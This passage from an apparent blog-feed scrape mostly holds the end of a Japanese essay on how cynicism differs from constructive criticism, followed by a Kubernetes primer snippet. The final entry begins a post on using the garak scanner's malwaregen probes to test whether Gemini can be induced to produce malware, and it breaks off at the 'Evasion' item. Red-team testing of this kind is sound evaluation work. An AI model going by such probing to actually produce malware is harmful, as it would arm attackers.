。感性が乏しいのは、冷笑を楽しめない人ではない。冷笑の快楽しか知らない人だ。本当に感性が豊かな人は、冷笑の快楽も、批評の深さも、行動の喜びも知っている。創造する充実感も知っている。私は、冷笑の快楽を否定しない。ただ、それが唯一の快楽だと思わないでほしい。それがすべてだと思わないでほしい。もっと大きな快楽がある。もっと深い充実感がある。もっと持続する豊かさがある。それは、行動すること。創造すること。リスクを取ること。そして、時には失敗すること。冷笑の快楽を知った上で、それでも行動する。この両方を知っている人こそが、本当に豊かな人だ。視野を広げた先にある絶望。そして冷笑へ視野を広げれば広げるほど、世界の複雑さが見えてくる。簡単な解決策などない。どんな行動にも副作用がある。誰かの正義は、誰かの不正義になる。理想的な制度など存在しない。すべてはトレードオフだ。視野を広げれば広げるほど、世界は希望ではなく絶望に満ちているように見えてくる。何かを変えようとする試みは、あまりにも無力に見える。理想を語る人々は、現実を知らないナイーブな存在に見える。そして、この絶望が、冷笑を生む。冷笑主義は、絶望の裏返しだ。世界を変えられないという絶望。自分には力がないという絶望。この絶望を直視する代わりに、他人を嘲笑することで、自分は少なくとも「騙されていない賢い人間だ」と思い込む。視野を広げすぎて、複雑さに圧倒されて、行動が麻痺する。そして、その麻痺を正当化するために、冷笑する。「どうせ無理だ」と言っておけば、自分が行動しないことを正当化できる。「現実はもっと複雑だ」と言っておけば、他人の試みを笑える。「あなたは世界を知らない」と言っておけば、自分は賢いと思える。これが、視野を広げすぎることの罠だ。世界の複雑さを知ることは重要だ。でも、その複雑さに圧倒されて、行動を止めてしまうなら、知らない方がマシだったかもしれない。視野を広げることで、私は批判と冷笑の違いを学んだ。でも同時に、冷笑の甘い罠にも落ちかけた。語りえぬものについて――あるいは、全てに答えを出そうとする傲慢さ視野を広げすぎた先で、私はもう1つの重要なことに気づいた。世の中には、言葉で説明できないことがある。道徳、倫理、美しさ、信仰。これらは論理的に「正解」を出せるものではない。でも、視野を広げすぎた人間は、これらにも「正しい答え」があると思い込む。全てを言葉で説明できると考える。全てを論理的に割り切れると信じる。そして、答えが出せないことに気づくと、絶望する。「こんなに複雑なのか」「矛盾だらけじゃないか」「結局、誰も答えを持っていない」。その絶望が、冷笑を生む。でも、待ってほしい。そもそも、全てに答えを出す必要などないのだ。環境問題について、明確な答えを持つ必要はない。格差について、万人が納得する解決策を見つける必要はない。技術選定について、絶対的に正しい判断を下す必要はない。言葉で説明できないことは、説明しなくていい。答えが出ないことは、答えを出さなくていい。世の中が広がりすぎて、全てを理解することなど不可能なのだ。これは諦めではない。冷笑でもない。これは、自分の限界を謙虚に認めることだ。言葉で全てを割り切れると考えてしまうのは、人間の「おごり」だ。この傲慢さが、視野を広げすぎた人を冷笑に追い込む。「全てに答えを持たなければならない」というプレッシャーが、「どうせ答えなんてない」という絶望を生む。そして、絶望が冷笑を生む。でも、本当は違う。全てに答えを出そうとしなくていい。自分が深く関わる一点だけに集中すればいい。他のことは、今は考えなくていい。今は分からないことは、分からないままでいい。視野を広げることで、世界の複雑さを知る。それは大切だ。でも、その複雑さの全てに答えを出そうとする必要はない。説明できないものは、無理に説明しなくていい。そして、自分が語れる一点、自分が行動できる一点に、全力を注げばいい。これを「冷笑主義だ」と言うなら、それは誤解だ。私は何も冷笑していない。ただ、自分の限界を認めている。全てを説明できるという幻想を捨てている。そして、その上で、自分にできることに集中している。考えを言葉にすることと、冷笑は違う。答えを出さないことと、冷笑は違う。低い解像度で混同するな。視野を広げて複雑さを知ることと、その複雑さの全てに答えを出そうとすることは違う。むしろ、自分が深く関わる一点だけに集中する――この視野を意図的に狭めることこそが、冷笑から抜け出す鍵になる。境界線は、実は曖昧だここで重要な認識がある。冷笑と批判と批評の境界線は、明確ではない。私が「これは建設的な批判だ」と思って発言したことが、相手には「冷笑」に聞こえる。例えば、「このコードは、こういう理由でスケールしない。別のアプローチを検討すべきだ」という指摘。私は具体的に問題点を指摘し、代替案の方向性も示している。これは建設的批判のつもりだ。でも、相手からは「結局ダメ出ししているだけじゃないか」「自分では実装しないくせに」「冷笑主義者だ」と受け取られるかもしれない。逆に、私が「これは明らかに冷笑だ」と思う発言が、本人は「正当な批判だ」と思っている。境界線は、曖昧だ。グラデーションだ。白か黒かでは割り切れない。そして、もっと複雑なのは、同じ人間の中に、建設的批判と冷笑が混在していることだ。私がある問題を指摘する。その動機の70%は「より良くしたい」という建設的な意図だ。でも、30%は「優越感」という冷笑的な動機が混じっている。純粋な批判だけというものは、ほぼ存在しない。冷笑だけというものも、実は少ない。ほとんどの場合、混ざっている。だからこそ、「冷笑主義だ」というレッテル貼りは危険だ。普通に気になる部分に対する言及を冷笑主義だけでキャンセルできると思うなここで強調したいのは、「冷笑主義」というレッテル貼りで、すべての批判を無効化しようとする態度の危険性だ。私が何かの問題点を指摘する。論理の矛盾を指摘する。データの不備を指摘する。すると、「それは冷笑主義だ」と言われる。「あなたは何も行動していない」「傍観者だ」「批判するだけで代替案がない」。待ってくれ。私は、ちゃんと考えている。具体的に指摘している。なぜその方法では難しいのか、論理的に説明している。可能であれば、代替案も提案している。それを「冷笑主義」の一言で片付けられることに、強く反発する。普通に気になる部分に対する言及を、「冷笑主義」というレッテル貼りだけでキャンセルできると思うな。批判を封じることは、思考を止めることだ。議論を殺すことだ。改善の機会を失うことだ。もし冷笑や批判、批評が全てダメだというのであれば、それは思考停止を意味するのではないだろうか。例えば、世の中に溢れる全てのビジネス書を無批判に信じて、矛盾する内容であっても全て実践するのか? それは現実的に不可能だし、批判的思考を放棄することになる。むしろ、健全な批評精神を持ちながら、有益な情報を選別し、自分の状況に合わせて取り入れることこそが重要ではないだろうか。もちろん、建設的でない批判もある。ただ嘲笑するだけの冷笑もある。でも、すべての批判がそうではない。ちゃんと考えた上での批判もある。具体的な問題点を指摘する批判もある。この区別をせずに、すべてを「冷笑主義」と呼ぶことは、知的誠実性を欠いている。低い解像度で物事を見るな。高い解像度で見ろ。その批判は、動機を疑っているのか、方法を疑っているのか。価値を問うているのか。嘲笑しているのか、改善案を提案しているのか。リスクを取らずに安全地帯から石を投げているのか、自分もリスクを取って一緒に考えようとしているのか。この区別ができないなら、「冷笑主義」という言葉を使うべきではない。考えを言葉にすることと、冷笑は違う。低い解像度で冷笑主義って言わないでくれ。境界線が曖昧だからこそ、高い解像度で見る努力が必要だ。「これは冷笑だ」「これは批判だ」「これは批評だ」と単純に割り切るのではなく、そのグラデーションを見る。その発言の中に、どれくらい建設的な意図があって、どれくらい冷笑的な動機があるのか。正確には測れない。でも、考える価値はある。SNSと現実世界――もう1つの境界線ここで、もう1つ重要な境界線について触れなければならない。SNSでの態度と、現実世界での態度は、まったく別物だ。SNSには、価値のない議論が溢れている。根拠のない主張。感情的な罵倒。誰も読まない長文の応酬。生産性のない不毛な論争。こういったものに対して線を引くことは、正しい。「これには関わらない」と判断することは、むしろ賢明だ。無限に存在するノイズに、いちいち反応していたら、時間がいくらあっても足りない。SNSでは、批評的な視点を持つことは重要だ。すべてを真に受けない。情報源を確認する。論理の矛盾を見抜く。この姿勢は、情報リテラシーの基本だ。でも、この態度を現実世界に持ち込むな。現実世界で、目の前にいる人の話を「価値がない」と切り捨てるな。同僚の提案に「どうせ無理だ」と冷笑するな。友人の熱意に「ネットで見た」と冷めた反応をするな。具体例：会議で同僚が新しいアイデアを提案している場合。SNSモード（避けるべき） →「それ、前にバズってた記事で論破されてたやつじゃん。調べてないの」（一方的に否定し、相手を責める）現実世界モード（望ましい） →「興味深いね。ただ、こういう課題があるんだけど、どう考えてる」（課題を共有し、一緒に考える）友人が転職について相談してきた場合。SNSモード（避けるべき） →「その業界、オワコンって言われてるよ。SNSで炎上してたし」（SNS情報を鵜呑みにして断定する）現実世界モード（望ましい） →「どうしてその業界に興味を持ったの。話を聞かせて」（まず理解しようとする）テレビのバラエティ番組での「論破」を、現実の職場や家庭に持ち込むな。SNSでの議論のスタイルを、実際の会議やディスカッションに適用するな。なぜなら、現実世界には、人がいるからだ。SNS上の匿名の発言と、目の前にいる人の発言は、まったく違う。SNS上の議論は、多くの場合、勝ち負けのゲームだ。相手を論破する。矛盾を指摘する。優位に立つ。でも、現実世界の対話は、ゲームではない。関係を築くことだ。お互いを理解することだ。一緒に問題を解決することだ。SNSで批判的思考を鍛えることは、価値がある。でも、その批判的思考を、現実世界で人を傷つける武器として使うな。SNSで冷笑的な視点を持つことは、時には必要だ。でも、その冷笑を、現実世界で人の熱意を奪う道具として使うな。場所による使い分けができない人は、SNSの悪い部分だけを現実世界に持ち込んでいる。SNSでは、批評的に。現実世界では、建設的に。この切り替えができないなら、冷笑主義者として生きることになる。そして、周りから人がいなくなる。境界線を引くことは重要だ。でも、その境界線は、SNSと現実世界の間にも引かなければならない。冷笑の快楽と、その代償冷笑は気持ちいい。それは認める。でも、その快楽には代償がある。冷笑の快楽は、短期的なものだ。その瞬間は気持ちいい。「ほら、やっぱりね」と優越感を覚える。「私は騙されなかった」と安心する。でも、この快楽は持続しない。なぜなら、冷笑は何も生み出さないからだ。批評は、次の行動につながる。「ここを改善すれば、もっと良くなる」。この過程で、学びがある。成長がある。達成感がある。冷笑は、何も生み出さない。「どうせ無理だ」で終わる。次がない。学びもない。成長もない。ただ、その瞬間の快楽だけ。そして、もっと深刻な代償がある。冷笑は、自分自身の行動を止める。何かに挑戦すれば、失敗する可能性がある。理想を語れば、裏切られる可能性がある。情熱を持てば、傷つく可能性がある。だから、冷笑主義者は、最初から信じない。最初から期待しない。最初から距離を置く。「どうせ無理だ」と言っておけば、失敗しても傷つかない。「やっぱりね」と言っておけば、予想通りだったと優越感すら覚えられる。冷笑は、安全地帯にいるための方法だ。でも、この安全地帯は実は牢獄だ。失敗から守ってくれるかもしれないが、同時に成功の可能性も奪っている。傷つかないかもしれないが、同時に成長の機会も失っている。私が問題視しているのは、この部分だ。冷笑の快楽そのものではない。冷笑が、思考を止め、行動を止め、成長を止めることだ。批評を楽しむことは、何も問題ない。矛盾を見つける快感。論理を構築する快感。より良い方法を提案する快感。価値を深く考察する快感。これらは、建設的な快楽だ。次につながる快楽だ。でも、ただ嘲笑することは違う。「どうせ無理」「意識高い系(笑)」「偽善者」。これらは、何も生み出さない。ただ、その瞬間の優越感だけ。そして、この優越感の中毒になると、抜け出せなくなる。自分に対する冷笑が、一番怖いでも、最も危険なのは、他人への冷笑ではない。自分に対する冷笑だ。「新しいことを始めたい」と思う。でも、自分に対して冷笑する。「どうせ続かない」「お前には無理だ」「また三日坊主だろう」。「挑戦したい」と思う。でも、自分に対して冷笑する。「失敗するに決まってる」「才能がないくせに」「身の程を知れ」。この自分に対する冷笑は、他人に対する冷笑よりも、さらに深刻だ。なぜなら、サボる理由になり得るからだ。行動しないことを正当化できる。「どうせ無理だから、やらない方が賢い」。挑戦しないことを正当化できる。「失敗するくらいなら、最初からやらない方がいい」。他人への冷笑は、他人の行動を止める。でも、自分への冷笑は、自分の人生を止める。そして、最も恐ろしいのは、この自分への冷笑が、「自己認識」や「現実的な判断」として正当化されることだ。「俺は自分のことをよく分かってる」「現実的に考えて無理だろう」「客観的に見て才能がない」。でも、それは本当に「自己認識」なのか。それとも、行動しないための言い訳なのか。シニカルで冷笑的な視点は、世界を見るときには役立つかもしれない。でも、自分に向けるな。自分の可能性に対して冷笑するな。自分の挑戦に対して「どうせ無理」と言うな。自分に対しては、冷笑ではなく、批評を。 「この方法では難しいかもしれない。じゃあ、別のアプローチは？」「今の自分には足りないものがある。じゃあ、何を学べばいい？」自分への冷笑は、思考を止める。自分への批評は、次の行動を生む。人を動かすのは、正しさではなく確信の強さここで、視野を広げることの逆説に触れなければならない。視野を広げれば広げるほど、絶対的に正しいものなど存在しないことが分かる。あらゆる主張には反論がある。あらゆる行動には副作用がある。あらゆる理想には矛盾がある。広い視野で十分に立証された正しさ――そんなものは、存在しない。でも、人を動かすのは、十分に立証された正しさではない。人を動かすのは、一点に集中した揺るぎない確信だ。視野を絞り込み、そこに全エネルギーを注ぎ込む強さだ。歴史を振り返れば、世界を変えた人々は、すべて正しかったわけではない。むしろ、多くの矛盾を抱えていた。偏っていた。視野が狭かった。でも、彼らには強い確信があった。「これは正しい」という信念があった。その信念が、行動を生んだ。そして、世界を変えた。視野を広げすぎた人は、行動できない。「でも、こういう反論もある」「でも、こういう副作用もある」「でも、十分ではない」。すべてが見えすぎて、動けなくなる。視野が狭い人は、行動できる。「これが正しい」と信じて、疑わない。矛盾は見えない。副作用も気にしない。ただ、突き進む。もちろん、これは危険だ。視野が狭いまま突き進むことは、暴走を生む。間違った方向に全力で進むことになる。でも、逆もまた真実だ。視野を広げすぎて、何も信じられなくなることも、危険だ。何も行動しなくなる。冷笑するだけになる。必要なのは、バランスだ。視野を狭めることの価値視野を広げることの価値は語られる。でも、視野を狭めることの価値は、ほとんど語られない。しかし、視野を狭めることには、重要な価値がある。そして、この価値を理解しないまま「視野を広げろ」とだけ言い続けることは、むしろ有害だ。人によっては、視野を狭くすることを「目覚めちゃう」と表現する場合もある。視野を絞ることで、それまで見えなかった深さに気づく。1つのことに没頭することで、初めて本質が見えてくる。この感覚を「目覚め」と呼ぶのだ。ただし、ここには注意が必要だ。陰謀論などに「目覚めちゃう」人も、大方この分類に入る。視野を極端に狭めて、1つの視点だけに固執する。「これこそが真実だ」と確信する。他の情報は「隠蔽されている」と切り捨てる。視野を狭めることの危険性は、ここにある。だから重要なのは、視野を広げた後に、意図的に狭めることだ。最初から狭いままではない。一度広げて、複数の視点を知った上で、今は、この一点に集中する、と選択する。この順番が、決定的に重要だ。集中できる視野を広げると、あらゆることが目に入る。世界中の問題がすべて自分の問題のように感じられる。環境問題、格差、戦争、差別、技術的負債、セキュリティ、パフォーマンス。でも、すべてに心を痛めていると、何もできない。認知科学の研究が示すように、人間の注意力には限界がある。同時に複数のことを考えようとすると、どれも中途半端になる。「マルチタスク」は幻想だ。実際には、高速に切り替えているだけで、その切り替えのたびに膨大なコストがかかっている。視野を狭めることで、1つのことに集中できる。「今は、これだけ」と決める。他の問題は、今は考えない。この許可が、行動を可能にする。「他のことも考えなければ」というプレッシャーから解放される。認知負荷が減る。そして、目の前の1つのことに、全エネルギーを注げる。例えば：エンジニアが新機能の実装中、「セキュリティも」「パフォーマンスも」「将来の拡張性も」すべてを同時に考えると、何も前に進まない。でも、「今日は、まずこの機能を動かす」と決める。セキュリティやパフォーマンスは、次のフェーズで考える。この割り切りが、プロジェクトを前に進める。これは怠慢ではない。戦略だ。限られたリソースを、最も重要な一点に集中させる。その一点を確実に動かす。そして、次の一点に移る。すべてを同時にやろうとして何も動かさないより、1つずつ確実に動かす方が、結果的に多くのことを成し遂げる。深く入り込める広く浅くより、狭く深く。視野を広げると、すべてを表面的にしか理解できなくなる。環境問題についても、格差についても、戦争についても、それぞれを少しずつ知っているだけ。でも、どれも深くは理解していない。「知っている」と「理解している」は違う。知識の量と、理解の深さは比例しない。むしろ、広く浅く知識を集めることは、理解を妨げることがある。なぜなら、本質は表面にはないからだ。問題の本質は、深く掘り下げた先にある。一見無関係に見える要素が、実は深い部分でつながっている。この構造が見えて初めて、「理解した」と言える。でも、この深さに到達するには、時間がかかる。1つの問題に、じっくりと向き合う時間が必要だ。視野を狭めることで、1つの問題に深く入り込める。本質が見えてくる。構造が見えてくる。そして、自分にできることが見えてくる。表面的な理解しかない人は、表面的な批判しかできない。深く理解した人は、本質的な批判ができる。表面的な冷笑と、深い批評の違いは、ここにある。例えば：「React、Vue、Angular、Svelte、全部知ってます」という人と、「Reactを5年間、業務で使い続けています」という人。複雑なパフォーマンス問題が発生したとき、解決できる可能性が高いのは後者だ。なぜなら、Reactの内部実装、レンダリングの仕組み、状態管理の本質を、深く理解している可能性が高いからだ。そして、その理解は、他のフレームワークにも応用できる。これは、エンジニアリングでも同じだ。多くの技術を広く浅く知っている人より、1つの技術を深く理解している人の方が、複雑な問題を解決できる。なぜなら、1つの技術を深く理解する過程で、すべての技術に共通する本質的な原理を学んでいるからだ。視野を狭めて深く入り込むことは、視野を広げることの対極ではない。むしろ、本当の意味で視野を広げるための前提条件だ。物語に没入できる視野を広げると、すべてを相対化してしまう。「これも1つの視点に過ぎない」「他の視点もある」「絶対的な正解などない」。この相対主義は、一見知的に見える。でも、これは実は何も信じられなくなる病気だ。相対主義者は、あらゆる物語を「所詮は1つの視点」として扱う。小説を読んでも、「これは作者の主観だ」と距離を置く。映画を観ても、「これは演出だ」と醒めている。誰かの体験談を聞いても、「それはあなたの解釈だ」と疑う。そして、その姿勢が、知的で賢いと思っている。でも、違う。それは、何も感じていないだけだ。何も学んでいないだけだ。心を動かされることを、恐れているだけだ。物語に没入することは、騙されることではない。一時的に、その物語の世界の論理に身を委ねることだ。その世界を信じてみることだ。視野を狭めることで、1つの物語に没入できる。一冊の本に没入する。1つの映画に没入する。一人の人の話に没入する。この没入こそが、感動を生む。学びを生む。変化を生む。物語に没入できるというのは、才能だ。すべてを相対化して、距離を置いて、冷笑する。これは賢く見えるかもしれないが、実は何も感じていないだけだ。何も得ていないだけだ。子供は物語に没入できる。絵本を読んで、本気で心配する。映画を観て、本気で泣く。誰かの話を聞いて、本気で驚く。大人になると、「こんなのフィクションだ」「現実はもっと複雑だ」と距離を置く。「子供じゃないんだから」と、没入することを恥ずかしがる。でも、フィクションだからこそ、本質が見えることがある。単純化されているからこそ、重要なメッセージが伝わることがある。1つの視点だからこそ、その視点の論理を徹底的に追求できる。没入することは、批判的思考を放棄することではない。一度没入して、深く理解して、それから批判的に検討する。この順番が重要だ。最初から距離を置いて批判的に見ていたら、表面しか見えない。没入して初めて、深い部分が見える。そして、深い部分を理解した上で、批判的に検討する。それが批評だ。視野を狭めることは、弱さではない。むしろ、強さだ。すべてを相対化する誘惑に抗して、1つのことを信じる強さ。すべてを疑う誘惑に抗して、1つのことに没入する強さ。確信を持てるそして、最も重要なのは、確信を持てることだ。視野を広げすぎると、確信が持てなくなる。「でも、こういう反論もある」「でも、こういう副作用もある」「でも、十分ではない」。すべての選択肢に問題が見える。理想的な選択肢など存在しない。そして、確信が持てないと、行動できない。行動には、確信が必要だ。「これが正しい」という信念が必要だ。矛盾があっても、副作用があっても、それでも「これをやる」と決める勇気が必要だ。視野を狭めることで、この確信が持てる。他の選択肢は、今は考えない。他の反論は、今は聞かない。今は、この1つを信じる。これは盲目的ではない。視野を広げた時に、すべての選択肢を検討した。すべての反論を知った。その上で、今は、この1つを選ぶ。行動する時には、迷わない。疑わない。ただ、信じて、進む。この確信が、行動を生む。行動が、結果を生む。結果が、世界を変える。視野の切り替え。学ぶ・行動する・振り返る誤解しないでほしい。私は「視野を狭くしろ」と言っているのではない。視野を広げることは、重要だ。視野を狭いままでいることは、危険だ。盲目的になる。暴走する。間違った方向に全力で進む。必要なのは、切り替えだ。視野を広げる時期と、視野を狭める時期を、意識的に切り替える。この切り替えこそが、成長の鍵だ。学ぶ時は、視野を広げる新しいことを学ぶ時、徹底的に視野を広げる。本を読む。講演を聞く。議論をする。多様な視点を取り入れる。反論を知る。矛盾を知る。限界を知る。「絶対的に正しいものなど存在しない」ことを知る。この時期は、確かに絶望的に感じるかもしれない。「こんなに複雑なのか」「こんなに矛盾があるのか」と。でも、この複雑さの認識が、思考を深める。表面的な理解から、構造的な理解へ。単純な解決策から、本質的な解決策へ。冷笑ではなく、批評ができるようになる。例えば：新しいアーキテクチャパターンを学ぶとき、まずは複数の記事、書籍、カンファレンストークを見る。賛成意見も反対意見も読む。成功事例も失敗事例も知る。「このパターンは万能ではない」「こういう場合には向かない」という限界を理解する。ただし、期間を限定する。「今月は、環境問題について学ぶ」と決める。そして、月末には一旦止める。延々と学び続けない。なぜなら、学ぶことには終わりがないからだ。いつまでも学び続けていたら、行動できない。「まだ十分に理解していない」と言い訳をして、安全地帯に留まり続ける。そして、冷笑だけをするようになる。学びの期間と、行動の期間を、明確に分ける。行動する時は、視野を狭める行動する時、視野を狭める。「今は、これだけ」と決める。他の問題は、今は考えない。他の視点は、今は取り入れない。他の反論は、今は聞かない。視野を広げた時に得た知識は、背景にある。でも、前面には出さない。例えば：学習フェーズで、マイクロサービスアーキテクチャの長所も短所も理解した。スケーラビリティの利点も、運用コストの問題も知っている。でも、実装フェーズでは、「今は、このサービスをマイクロサービスで作る」と決める。「本当にマイクロサービスでいいのか」「モノリスの方が良いのでは」という迷いは、今は脇に置く。まず作る。動かす。その後で振り返る。「でも、こういう反論もある」とは考えない。「でも、十分ではない」とは考えない。今は、この1つを信じる。今は、この1つに集中する。これは、学んだことを無視することではない。学んだ上で、今は、この1つの視点から行動する、という選択だ。行動中に視野を広げると、迷いが生まれる。「これでいいのか」「他の方法の方がいいのではないか」。この迷いが、行動を止める。冷笑に戻る誘惑になる。行動は、確信を必要とする。だから、行動する時は、視野を狭める。振り返る時は、また視野を広げる行動した後、振り返る時、また視野を広げる。「あの行動は、どういう意味があったのか」「他にもっと良い方法はなかったか」「見落としていた視点はないか」「どういう副作用があったか」。この振り返りが、次の行動を改善する。学んだこと、行動したこと、その結果。これらを統合して、次の行動計画を立てる。ここで、冷笑と批評の違いが重要になる。振り返りの時に冷笑するな。「やっぱりダメだった」「どうせ無理だった」。これは何も生まない。振り返りの時は、批評をする。「この方法には、こういう問題があった。次はこう改善しよう」「この行動は、こういう価値があった。こういう意味があった」。でも、行動中には、この振り返りはしない。行動と振り返りを、明確に分ける。今は行動する時なのか、振り返る時なのか。意識的に切り替える。多くの人が失敗するのは、この切り替えができないからだ。行動中に振り返りをしてしまう。「これでいいのか」と疑い始める。そして、行動が止まる。冷笑に戻る。あるいは、振り返りの時に行動モードのままでいる。「あの時の判断は正しかった」と正当化する。そして、学びを得られない。学ぶ時は学ぶ。行動する時は行動する。振り返る時は振り返る。この切り替えを、意識的に行う。これが、視野を広げることと狭めることのバランスを取る、具体的な方法だ。そして、冷笑に陥らず、批評を活かす方法だ。エンジニアが評論家に転じる危険エンジニアリングの世界では、冷笑主義は特殊な形で現れる。「評論家気取り」という形で。かつてコードを書くことに情熱を注いでいた人々が、いつの間にか他人の成果物を論評することに執心するようになる。この現象は、特にベテランと呼ばれるエンジニアたちの間で顕著だ。「このコードは素人レベルで時代遅れです」「アーキテクチャへの理解が浅く、重要な議論が抜け落ちています」「技術選定の根拠が説明されていない」。SNSには辛辣な評論が溢れ、技術ブログには高圧的な論評が並び、OSSのイシューには不建設的な批判が並ぶ。誰かが技術ブログを書けば、「この説明は不正確」「この例は不適切」と指摘が飛ぶ。誰かがカンファレンスで発表すれば、「あの発表は薄かった」「もっと深い内容を期待していた」とSNSで批評される。問題は、これらの言説が建設的な議論を装いながら、実際には単なる冷笑に終始している点だ。改善案を示すわけでもなく、プルリクエストを送るわけでもなく、自分で記事を書くわけでもなく、ただ「ダメ出し」だけを繰り返す。具体例：ある技術ブログの記事を読んだとき。評論家モード（冷笑的） →「この記事は浅い。技術の本質が理解できていない可能性がある。初心者向けとしても不十分だ」（SNSに投稿して終わり）創造者モード（建設的） →「この記事を読んで、もっと深い部分を説明する補足記事を書こう」または「コメント欄で、具体的にこの部分をこう補足すると良いかも、と提案しよう」そして、この評論には誘惑がある。技術ブログへの評論記事は数時間で書け、発表資料への批判は数分で完結し、SNSなら数行のポストで事足りる。実装を伴う苦労も、メンテナンスの責任も、失敗のリスクも必要ない。最も注意すべきは、その行為が「いいね」という即時の報酬と、表面的な自己肯定感をもたらすことだ。賢明な分析家として認められ、技術の識者として扱われる。この心地よさが、さらなる評論への逃避を促していく。これは、冷笑主義の典型的なパターンだ。自分は何も作らない。リスクを取らない。ただ、他人の実装を批判する。他人のブログを批評する。他人の発表を論評する。矛盾を指摘する。「これは時代遅れ」「これは不十分」。そして、「自分なら分かっている」と思う。でも、ここで区別が必要だ。コードレビューは、評論ではない。技術的な批評は、冷笑ではない。深い批評は、価値がある。コードレビューは、具体的な改善案を示す。「ここをこうすれば、パフォーマンスが向上する」「この部分は、こういう理由でバグの原因になりうる」。これは建設的だ。次の行動につながる。技術ブログへの建設的なフィードバックも同じだ。「この部分の説明は分かりにくい。こう書いた方が伝わりやすい」「この例には、こういうケースも追加するとより理解が深まる」。これは書き手を助ける。読者も助ける。技術的な批評も価値がある。「この技術は、こういう文脈で生まれた。こういう思想がある。だから、こういう場面で有効だ」。深く理解しようとする。本質を問う。でも、評論家気取りの冷笑は違う。「このコードは素人レベル」「このブログは薄い」「この発表は時代遅れ」。具体的な改善案はない。ただ、ダメ出しだけ。動機を疑う。そして、最も重要な違いは、建設的な批評をする人は、自分もコードを書いている。自分もブログを書いている。自分も発表している。自分もリスクを取っている。自分も失敗している。評論家気取りは、自分ではもう作らない。自分では書かない。自分では発表しない。安全地帯から、他人の試みを批判するだけ。でも、ここでも境界線は曖昧だ。コードレビューのつもりが、相手には冷笑に聞こえることもある。技術ブログへのフィードバックのつもりが、書き手には冷笑に感じられることもある。評論のつもりだった発言が、実は建設的な批評だったこともある。明確には線を引けない。でも、自問できる。「自分は、創造者であり続けているか。それとも、評論家に転じつつあるか」。エンジニアの本質的価値は、創造する能力にある。冷笑だけの評論家ではなく、コードで語る創造者であり続けること。ブログを書くなら、冷笑的な評論記事だけでなく、自分の知見を共有する記事も書くこと。批評をするなら、価値を深く問うこと。「作れる」ことと「分かる」ことは違う。でも、作ることから離れれば離れるほど、本当の意味で「分かる」ことからも遠ざかっていく。書くことから離れれば離れるほど、文章を評価する目も曇っていく。私が問題視しているのは、この違いだ。建設的な批評と、冷笑主義的な評論。この区別をしないまま、すべてを「冷笑主義だ」と呼ぶことは、間違っている。逆に、すべての批判を「建設的だ」と正当化することも、間違っている。エンジニアが評論家に転じるとき、それは衰退の予兆かもしれない。でも、深い批評は、技術の発展に不可欠だ。重要なのは、創造と批評のバランスだ。コードを書き続けること。実装し続けること。そして、その経験に基づいて、深い批評をすること。それが、冷笑主義に陥らないための、エンジニアとしての矜持だ。おわりに一歩引いた場所から世界を見渡すと、すべてが見える。新しい技術に熱狂する人々の、数年後の幻滅。ビジネス書に感動する人々の、矛盾への無関心。世の中の理不尽に憤慨する人々の、複雑さへの無理解。AIの新機能に「世界が変わる」と興奮する人々の、変わらない日常。インフルエンサーの「新しい教え」に感動する人々の、それが数千年前の知恵の言い換えだという事実への無関心。冷笑は、気持ちいい。楽だ。傍観者でいればいい。この楽さの中毒性が、人を冷笑に縛り付ける。でも、冷笑と批判と批評は、まったく違う。冷笑は何も生み出さない。批判は次につながる。批評は対話を生む。境界線は曖昧だ。それでも、だからこそ、高い解像度で見る努力が必要なんだと思う。視野を広げすぎると、絶望が見える。世界の複雑さに圧倒される。「すべてを理解し、すべてに答えを出さなければならない」という傲慢さに囚われる。でも、すべてに答えを出そうとする必要などない。自分の限界を謙虚に認める。自分が深く関わる一点だけに集中する。視野を広げることと、視野を狭めること。この切り替えが、冷笑の罠から抜け出す鍵だ。世界は複雑だ。矛盾に満ちている。絶対的な正しさは存在しない。だからといって、冷笑していいわけじゃない。「考えを言葉にすること」と「冷笑」は違う。「答えを出さないこと」と「冷笑」は違う。「批判すること」と「冷笑」は違う。低い解像度で混同するな。そして、もう1つ。SNSでの態度を、現実世界に持ち込むな。SNSで批評的な視点を持つことは正しい。価値のない議論に線を引くことは賢明だ。でも、その態度を、目の前にいる人に向けるな。テレビの論破番組を、現実の対話に持ち込むな。場所による使い分けができないなら、冷笑主義者として生きることになる。そして、周りから人がいなくなる。一歩引いた場所から見ることには、価値がある。俯瞰的な視点は、物事の本質を見抜く。でも、ずっと傍観者でいることには、代償がある。批評の深さを知った上で、行動する。冷笑の快楽を知った上で、創造する。複雑さを理解した上で、一点に集中する。絶望を見た上で、確信を持つ。この両方を知っている人こそが、本当に豊かな人だ。高解像度で見続けろ。曖昧さを受け入れろ。批評の力を活かせ。でも、冷笑の甘い罠には落ちるな。そして、一歩引いた場所から、一歩前に踏み出せ。批評の教室　──チョウのように読み、ハチのように書く (ちくま新書)作者:北村紗衣筑摩書房Amazon批評理論を学ぶ人のために世界思想社Amazonアテンション・エコノミーのジレンマ　〈関心〉を奪い合う世界に未来はあるか作者:山本 龍彦KADOKAWAAmazonきみに冷笑は似合わない。　SNSの荒波を乗り越え、AI時代を生きるコツ (日本経済新聞出版)作者:山田尚史日経BPAmazonエビデンスを嫌う人たち: 科学否定論者は何を考え、どう説得できるのか?作者:リー・マッキンタイア国書刊行会AmazonScience Fictions　あなたが知らない科学の真実作者:スチュアート・リッチーダイヤモンド社Amazon","isoDate":"2025-11-09T23:42:05.000Z","dateMiliSeconds":1762731725000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"k8s超入門: 基本的なコンポーネントの概要まとめ","link":"https://zenn.dev/takehiro1111/articles/kubernetes_basic","contentSnippet":"1.記事を書いた背景業務でEKSの環境を構築しており、知識を補完,整理するために記事として残しています。公式のチュートリアルをサクッとレベルで対応しながら書いてます。 2.対象読者Kubernetes初学者,未経験者(自分みたいな) 書くことイメージしやすい範囲でk8sコンポーネントの概要今の時点で深入りしてもよく分からんってなるので、概要レベルのみの記述です。手を動かして実際のデプロイ環境を作る際に細かい書き方とか機能を必要に応じて調べれば良い。 書かないこと詳細レベルやプラグイン等の解説EKS,GKE等のクラウドプロバイダ特有の設定...","isoDate":"2025-11-09T06:48:49.000Z","dateMiliSeconds":1762670929000,"authorName":"takehiro1111","authorId":"takehiro1111"},{"title":"garakを用いてGeminiのマルウェア生成に対する脆弱性検知をしてみた","link":"https://zenn.dev/akasan/articles/ea22af110e5936","contentSnippet":"もはやシリーズになりつつあるgarakを使ってモデルの検知をしてみた検証になります。今回はGeminiに対してマルウェア生成に対する脆弱性検知をしてみました。過去のgarakを使ってみた検証は以下のスクラップにまとめているのでぜひご覧ください。https://zenn.dev/akasan/scraps/6469ce61948ddd 今回対象とするプローブ今回は以下のmalwaregenになります。項目としては4つあります。Evasion: 